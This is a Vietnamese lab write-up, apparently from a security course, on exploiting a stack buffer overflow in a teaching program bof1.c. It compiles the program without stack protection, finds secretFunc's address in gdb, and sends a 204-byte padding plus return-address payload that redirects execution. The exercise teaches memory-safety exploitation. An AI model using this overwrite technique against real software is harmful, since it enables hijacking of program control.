### Chi tiết Buffer-overflow trên file bof1.c
***
#### Mục đích của bài này là dùng buffer-overflow để gọi được hàm secretFunc()
Xem qua code ta có thể thấy lỗ hỏng nó đến từ hàm get(array) của hàm vuln(). Vì vậy ta sẽ dùng buffer-overflow để làm tràn biến array xuống phần return address và cái phần được tràn vào return adddres là địa chỉ của hàm secretFunc() thì lúc đó hàm secretFunc() sẽ được gọi


![image](https://github.com/user-attachments/assets/061f6e08-a811-4b5e-9e22-e625c0b706a3)
***
#### Các bước thực hiện
* Bước 1: Biên dịch file
  ```
  gcc -g bof1.c -o bof1.out -fno-stack-protector -mpreferred-stack-boundary=2
  ```
* Bước 2: Lấy địa chỉ hàm secretFunc()

  Vào gdb:
  ```
  qdb -q bof1.out  
  ```
  Xem địa chỉ hàm
  ```
  disas secretFunc
  ```
  ![image](https://github.com/user-attachments/assets/3c883274-5ee1-44a6-a82a-c0161b96d775)

  => Địa chỉ hàm secretFunc() là 0x0804846b
* Bước 3: Điểm qua stackframe

  
  ![image](https://github.com/user-attachments/assets/4d515abb-0962-408a-912b-f1e2d36ce6b2)


  ta thấy mảng array chứa tối đa 200 bytes và ebp là 4 bytes nên ta cần truyền vào input 204 kí
  tự ngẫu nhiên và truyền thêm 4 bytes địa chỉ hàm secretFunc() nữa để đè lên return addr là ta có thể gọi hàm này
* Bước 4: Thực hiện truyền input
  ```
  echo $(python -c "print('a'*204 + '\x6b\x84\x04\x08')") | ./bof1.out
  ```
  Kết quả:
  ![image](https://github.com/user-attachments/assets/eea0cbe7-a3a0-48b8-b9bc-8d79118d33b2)

  => Thành công
